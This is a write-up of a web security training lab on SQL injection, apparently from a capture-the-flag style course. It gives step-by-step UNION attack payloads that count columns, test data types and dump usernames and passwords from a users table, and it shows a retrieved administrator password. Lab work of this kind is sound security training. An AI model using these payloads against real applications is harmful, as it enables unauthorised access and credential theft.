# Description:
 
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

# Analysis:

SQL Injection - Product category filter.

End Goal - Output the usernames and passwords in the users table and login
as the administrator user.

### We need to make three steps to resolve this lab, two preliminary and one retrieving the information that we need:
    1) - Determine the number of columns that the vulnerable query is using.
        query = ' order by 1--
        query = ' order by 2--
        query = ' order by 3-- 
            -> err -> There are two columns because it failed at three.
        
        Number of columns: 2.
    
    
    2) - Determine the data type of the columns.
        query thas is being made to the backend: 
            select a, b from producst where category='Gifts'
        
        query using the union attack:
            ' UNION select 'a', NULL--
            ' UNION select NULL, 'a'--

            Both columns are of data type string.
    
    3) - query:
        ' UNION select username, password from users--

        Now we have the administrator and the password:
            username: administrator
	        password: 7p147uglukj4zpgreb9q